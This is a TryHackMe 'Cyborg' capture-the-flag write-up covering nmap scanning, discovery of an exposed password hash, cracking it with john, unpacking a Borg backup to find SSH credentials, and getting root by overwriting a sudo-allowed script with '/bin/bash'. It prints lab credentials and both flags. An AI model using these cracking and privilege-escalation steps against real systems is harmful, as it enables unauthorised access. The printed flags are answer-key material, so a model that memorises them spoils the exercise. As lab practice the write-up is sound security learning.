---
title: "Cyborg THM"
date: 2026-05-18 12:00:00 +0300
categories: [Writeups, TryHackMe]
tags: [tryhackme, ctf, writeup, pentesting, security]
description: "Subdomain enumeration, Borg Backup repository extraction and decryption, hash cracking, and sudo script execution."
image:
  path: /assets/img/posts/cyborg_thm.webp
  alt: Cyborg THM
---

# Enumaration

## nmap

```jsx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 13:26 EST
Nmap scan report for 10.10.107.32
Host is up (0.076s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

there isnt much to do. lets begin web crawling

## Web Crawling

in source code we see this:

![image.png](/assets/img/writeups/cyborg-thm_image_61.png)

so we see it and stumble upon cve-2016-4979

![image.png](/assets/img/writeups/cyborg-thm_image_62.png)

i am stuck with this for a while so trying another stuff

## gobuster

we found 2 pathfiles

if we go /etc, we see that there is 2 file

```jsx
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

```jsx
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

first one seems to be our key to go in ssh, however second file seems unimportant right now. 

if we go other pathfile we see this in admin

```jsx
 [Yesterday at 4.32pm from Josh]
                Are we all going to watch the football game at the weekend??
                ############################################
                ############################################
                [Yesterday at 4.33pm from Adam]
                Yeah Yeah mate absolutely hope they win!
                ############################################
                ############################################
                [Yesterday at 4.35pm from Josh]
                See you there then mate!
                ############################################
                ############################################
                [Today at 5.45am from Alex]
                Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
                I decided to give up like i always do ahahaha sorry about that.
                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
                Might pass it over to the IT guys but in the meantime all the config files are laying about.
                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
                other than that im pretty sure my backup "music_archive" is safe just to confirm.
```

we crack the password with john

```jsx
└─$ john hashfile.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)     
1g 0:00:00:00 DONE (2025-11-08 13:59) 3.703g/s 145066p/s 145066c/s 145066C/s 112806..lilica
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

it wasnt for ssh. 

we search for any other clue in admin path we see archives download it see it was borg backup, we download it. then unpack it with the password.

![image.png](/assets/img/writeups/cyborg-thm_image_63.png)

while searching for a clue we found a note.txt in documents

```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

```jsx
alex:S3cretP@s3
```

ssh into it

then retrieve the user flag

```
alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt 
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

```

then for priveledge escalation firstly we check sudo -l

then we find that we can exploit this file.

chmod 777 for all the permissions

echo bin bash for embedding our main exploit code

sudo for run it

```jsx
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
alex@ubuntu:~$ chmod 777 /etc/mp3backups/backup.sh 
alex@ubuntu:~$ echo '/bin/bash' > /etc/mp3backups/backup.sh 
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh 
root@ubuntu:~# whoami
root
root@ubuntu:~# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
root@ubuntu:/root# 

```
